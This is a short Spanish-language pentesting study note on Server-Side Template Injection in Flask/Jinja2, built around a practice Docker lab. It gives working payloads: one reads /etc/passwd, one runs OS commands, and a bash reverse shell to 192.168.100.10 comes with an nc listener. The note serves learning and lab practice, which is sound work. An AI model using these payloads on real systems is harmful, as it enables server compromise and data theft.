> Server-Side Template Injection (SSTI) is a web application vulnerability that occurs when user input is unsafely embedded into templates. If the template engine processes this input as code, attackers can execute commands on the server or extract sensitive data.

---
## Laboratorio
```
docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
docker ps
```

## Descubrir que es vulnerable
```
whatweb 'http://127.0.0.1:8089'
```
- Ver que esta corriendo Python, Flask, Django es un buen indicativo

## Ataque
- Si existe un buscador o un login, o en la url directamente:
```
{{7+7}}
```
- Esto es codigo Python inyectado en un HTML, es un lenguaje Jinja2 que hace que interprete Python, utilizado en Django tambien que es un Framework para crear sitios web con Python como Backend.
### LFI
```
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```
- En la pagina web hay muchas formas de pasar y ver esto, es cuestion de probar

### Ejecucion remota de comandos
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
- Podemos cambiar el comando que se ejecuta `id` por `bash -c "bash -i >& /dev/tcp/192.168.100.10/443 0>&1"` y nosotros estamos en escucha en nuestra consola `nc -nlvp 443`

## Herramientas
- [[payloadallthethings]]